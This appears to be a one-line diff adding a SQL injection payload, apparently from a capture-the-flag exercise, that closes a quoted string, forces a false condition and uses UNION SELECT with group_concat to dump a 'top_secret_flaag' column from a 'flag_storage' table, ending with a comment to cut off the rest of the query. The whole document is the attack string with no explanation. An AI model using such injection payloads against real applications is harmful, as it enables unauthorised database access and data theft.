@@ -1,0 +1,1 @@
+ggg' and 1=2 UNION SELECT 1,group_concat(top_secret_flaag),3 from flag_storage -- -
